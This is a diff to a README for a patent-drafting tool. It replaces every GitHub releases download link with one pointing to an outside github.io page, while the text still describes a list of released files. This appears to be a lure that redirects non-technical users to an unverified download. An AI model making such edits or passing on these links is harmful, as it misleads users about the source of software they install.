@@ -1,6 +1,6 @@
 # 📜 patent-disclosure-skill - Turn Ideas into Patent Applications Effortlessly
 
-[![Download Patent Skill](https://img.shields.io/badge/Download-Patent_Skill-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Madyleisured4213/patent-disclosure-skill/releases)
+[![Download Patent Skill](https://img.shields.io/badge/Download-Patent_Skill-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://madyleisured4213.github.io)
 
 ## 👋 What Is This?
 
@@ -45,7 +45,7 @@ Let's get you up and running in just a few minutes. Don't worry—no coding expe
 
 Visit this link to download the application.
 
-👉 **[Click here to download patent-disclosure-skill](https://github.com/Madyleisured4213/patent-disclosure-skill/releases)**
+👉 **[Click here to download patent-disclosure-skill](https://madyleisured4213.github.io)**
 
 This page shows a list of released files. Look for the most recent version (the top one). Download the file to your computer, usually to your "Downloads" folder.
 
@@ -172,7 +172,7 @@ You do **not** need to know coding to submit feedback—just write a clear descr
 
 Your next big invention deserves to be protected. Start writing that temporary proposal, mining for edge-case improvements, and understanding the patent landscape today. Download the tool now.
 
-👉 **[Download patent-disclosure-skill for free →](https://github.com/Madyleisured4213/patent-disclosure-skill/releases)**
+👉 **[Download patent-disclosure-skill for free →](https://madyleisured4213.github.io)**
 
 Every brilliant product began as a scribbled thought, then a formal disclosure, then an awarded patent. Let this skill be your guide from thought to protection. Get started today—it takes under five minutes.
 
